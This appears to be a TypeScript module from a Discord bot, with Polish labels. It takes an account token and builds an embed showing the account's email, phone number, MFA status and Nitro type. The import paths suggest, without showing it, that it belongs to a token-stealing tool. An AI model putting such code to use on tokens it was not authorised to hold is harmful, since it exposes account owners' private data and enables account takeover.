import { EmbedBuilder } from 'discord.js'
import { getRandomColor } from '@/bot/functions/visual-embed/colors'
import { getUserData } from '@/bot/functions/user-and-ip/user-data'

export const createUserEmbed = async (token: string): Promise<EmbedBuilder> => {
  const userData = (await getUserData(token)) as {
    id: string
    username: string
    discriminator: string
    email: string
    avatar: string
    phone?: string
    locale: string
    verified: boolean
    nsfw_allowed: boolean
    mfa_enabled: boolean
    premium_type: number
  }

  if (!userData) {
    return new EmbedBuilder()
      .setTitle('❌ Błąd')
      .setDescription('Nie udało się pobrać danych użytkownika, chuj nam w dupe ;( ')
      .setColor(0xff0000)
      .setTimestamp()
  }

  const embed = new EmbedBuilder()
    .setTitle('🌟 **Dane użytkownika** 🌟')
    .setColor(getRandomColor())
    .setThumbnail(`https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`)
    .addFields(
      {
        name: '👤 Username',
        value: `${userData.username}#${userData.discriminator}`,
        inline: true,
      },
      { name: '🆔 ID użytkownika', value: userData.id, inline: true },
      { name: '📧 Email', value: userData.email, inline: true },
      { name: '📱 Telefon', value: userData.phone || 'Brak', inline: true },
      { name: '🌍 Język', value: userData.locale, inline: true },
      { name: '✅ Weryfikacja', value: userData.verified ? 'Tak' : 'Nie', inline: true },
      { name: '🔞 Dostęp do NSFW', value: userData.nsfw_allowed ? 'Tak' : 'Nie', inline: true },
      { name: '🔐 MFA', value: userData.mfa_enabled ? 'Włączone' : 'Wyłączone', inline: true },
      {
        name: '💎 Typ Premium',
        value:
          userData.premium_type === 1
            ? 'Nitro Classic'
            : userData.premium_type === 2
              ? 'Nitro'
              : 'Brak',
        inline: true,
      }
    )
    .setTimestamp()
    .setFooter({ text: `Pobrane z Discorda` })

  return embed
}
